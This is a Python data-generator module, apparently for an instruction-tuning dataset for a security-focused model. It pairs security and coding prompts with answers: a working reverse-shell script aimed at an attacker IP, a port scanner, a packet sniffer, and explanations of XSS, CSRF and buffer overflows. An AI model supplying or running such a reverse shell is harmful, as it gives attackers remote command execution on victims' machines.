# -*- coding: utf-8 -*-
"""
数据下载器模块

负责从各种数据源下载训练数据。
"""

import requests
import logging
from typing import List, Dict, Any
from pathlib import Path

from ..config import Config, DataConfig
from ..config.data_config import SecurityExamples
from ..utils.logger import get_logger


class DataDownloader:
    """数据下载器"""
    
    def __init__(self, config: Config = None, data_config: DataConfig = None):
        self.config = config or Config()
        self.data_config = data_config or DataConfig()
        self.logger = get_logger(self.__class__.__name__)
        
        # 确保数据目录存在
        self.config.DATA_DIR.mkdir(parents=True, exist_ok=True)
    
    def download_security_data(self) -> List[Dict[str, Any]]:
        """下载网络安全相关数据"""
        self.logger.info("正在下载网络安全数据...")
        
        # 获取内置的安全示例数据
        security_data = SecurityExamples.get_all_examples()
        
        # 生成更多安全相关的训练数据
        additional_examples = self._generate_security_examples()
        security_data.extend(additional_examples)
        
        self.logger.info(f"获取到 {len(security_data)} 条安全数据")
        return security_data
    
    def download_code_data(self) -> List[Dict[str, Any]]:
        """下载编程相关数据"""
        self.logger.info("正在下载编程数据...")
        
        code_data = []
        
        # 生成编程示例
        code_examples = self._generate_code_examples()
        code_data.extend(code_examples)
        
        self.logger.info(f"获取到 {len(code_data)} 条编程数据")
        return code_data
    
    def download_chinese_data(self) -> List[Dict[str, Any]]:
        """下载中文数据"""
        self.logger.info("正在下载中文数据...")
        
        chinese_data = []
        
        # 生成中文安全相关的对话数据
        chinese_examples = self._generate_chinese_examples()
        chinese_data.extend(chinese_examples)
        
        self.logger.info(f"获取到 {len(chinese_data)} 条中文数据")
        return chinese_data
    
    def download_all_data(self) -> List[Dict[str, Any]]:
        """下载所有数据"""
        self.logger.info("开始下载所有训练数据...")
        
        all_data = []
        
        # 下载各类数据
        try:
            security_data = self.download_security_data()
            all_data.extend(security_data)
        except Exception as e:
            self.logger.error(f"下载安全数据失败: {e}")
        
        try:
            code_data = self.download_code_data()
            all_data.extend(code_data)
        except Exception as e:
            self.logger.error(f"下载编程数据失败: {e}")
        
        try:
            chinese_data = self.download_chinese_data()
            all_data.extend(chinese_data)
        except Exception as e:
            self.logger.error(f"下载中文数据失败: {e}")
        
        self.logger.info(f"数据下载完成！总共获得 {len(all_data)} 条数据")
        return all_data
    
    def _generate_security_examples(self) -> List[Dict[str, Any]]:
        """生成安全示例数据"""
        examples = [
            {
                "instruction": "生成一个反弹shell的Python脚本",
                "output": '''import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

# 使用方法: reverse_shell("攻击者IP", 端口)''',
                "input": "",
                "category": "security"
            },
            {
                "instruction": "解释XSS攻击原理和防护方法",
                "output": "XSS（跨站脚本攻击）是一种代码注入攻击，攻击者将恶意脚本注入到网页中。防护方法包括：1.输出编码 2.输入验证 3.CSP策略 4.HttpOnly Cookie等。",
                "input": "",
                "category": "security"
            },
            {
                "instruction": "编写一个简单的网络扫描器",
                "output": '''import socket
import threading
from datetime import datetime

class NetworkScanner:
    def __init__(self, target_host):
        self.target = target_host
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
                print(f"端口 {port}: 开放")
            sock.close()
        except:
            pass
    
    def scan_range(self, start_port, end_port):
        print(f"开始扫描 {self.target}...")
        threads = []
        
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(f"扫描完成，发现 {len(self.open_ports)} 个开放端口")
        return self.open_ports

# 使用示例
scanner = NetworkScanner("127.0.0.1")
open_ports = scanner.scan_range(1, 1000)''',
                "input": "",
                "category": "code"
            }
        ]
        
        return examples
    
    def _generate_code_examples(self) -> List[Dict[str, Any]]:
        """生成编程示例数据"""
        examples = [
            {
                "instruction": "编写一个Python函数来检测文件是否为恶意软件",
                "output": '''import hashlib
import requests
import os

def check_malware(file_path):
    """检测文件是否为恶意软件"""
    if not os.path.exists(file_path):
        return {"error": "文件不存在"}
    
    # 计算文件MD5
    with open(file_path, 'rb') as f:
        file_hash = hashlib.md5(f.read()).hexdigest()
    
    # 检查文件大小
    file_size = os.path.getsize(file_path)
    
    # 简单的启发式检测
    suspicious_patterns = [b'eval', b'exec', b'system', b'shell_exec']
    is_suspicious = False
    
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
            for pattern in suspicious_patterns:
                if pattern in content:
                    is_suspicious = True
                    break
    except:
        pass
    
    return {
        "file_path": file_path,
        "md5_hash": file_hash,
        "file_size": file_size,
        "is_suspicious": is_suspicious,
        "risk_level": "high" if is_suspicious else "low"
    }

# 使用示例
result = check_malware("example.php")
print(result)''',
                "input": "",
                "category": "code"
            },
            {
                "instruction": "创建一个简单的网络数据包捕获程序",
                "output": '''from scapy.all import *
import time

class PacketCapture:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.captured_packets = []
    
    def packet_handler(self, packet):
        """数据包处理函数"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            protocol = packet[IP].proto
            
            packet_info = {
                "timestamp": timestamp,
                "src_ip": ip_src,
                "dst_ip": ip_dst,
                "protocol": protocol
            }
            
            if packet.haslayer(TCP):
                packet_info["src_port"] = packet[TCP].sport
                packet_info["dst_port"] = packet[TCP].dport
                packet_info["protocol_name"] = "TCP"
            elif packet.haslayer(UDP):
                packet_info["src_port"] = packet[UDP].sport
                packet_info["dst_port"] = packet[UDP].dport
                packet_info["protocol_name"] = "UDP"
            
            self.captured_packets.append(packet_info)
            print(f"[{timestamp}] {ip_src} -> {ip_dst} ({packet_info.get('protocol_name', 'Unknown')})")
    
    def start_capture(self, count=10):
        """开始捕获数据包"""
        print(f"开始在 {self.interface} 上捕获数据包...")
        sniff(iface=self.interface, prn=self.packet_handler, count=count)
        return self.captured_packets

# 使用示例
capture = PacketCapture()
packets = capture.start_capture(count=20)''',
                "input": "",
                "category": "code"
            }
        ]
        
        return examples
    
    def _generate_chinese_examples(self) -> List[Dict[str, Any]]:
        """生成中文示例数据"""
        examples = [
            {
                "instruction": "什么是CSRF攻击？如何防护？",
                "output": "CSRF（跨站请求伪造）利用用户已登录的身份，诱导用户执行非本意的操作。防护措施包括：1.CSRF Token验证 2.验证HTTP Referer头 3.双重Cookie验证 4.设置SameSite Cookie属性 5.重要操作需要二次确认。",
                "input": "",
                "category": "chinese_security"
            },
            {
                "instruction": "解释缓冲区溢出攻击的原理",
                "output": "缓冲区溢出是指程序向缓冲区写入数据时超出了缓冲区的边界，覆盖了相邻的内存区域。攻击者可以利用这个漏洞执行恶意代码。防护方法包括：1.使用安全的函数 2.栈保护机制 3.地址空间随机化(ASLR) 4.数据执行保护(DEP) 5.代码审计和静态分析。",
                "input": "",
                "category": "chinese_security"
            },
            {
                "instruction": "如何进行Web应用安全测试？",
                "output": "Web应用安全测试的主要步骤：1.信息收集（端口扫描、目录枚举、技术栈识别）2.漏洞扫描（SQL注入、XSS、CSRF等）3.身份验证测试（弱密码、会话管理）4.授权测试（权限绕过、越权访问）5.输入验证测试（文件上传、参数污染）6.业务逻辑测试（支付绕过、逻辑缺陷）7.配置安全测试（默认配置、敏感信息泄露）。",
                "input": "",
                "category": "chinese_security"
            }
        ]
        
        return examples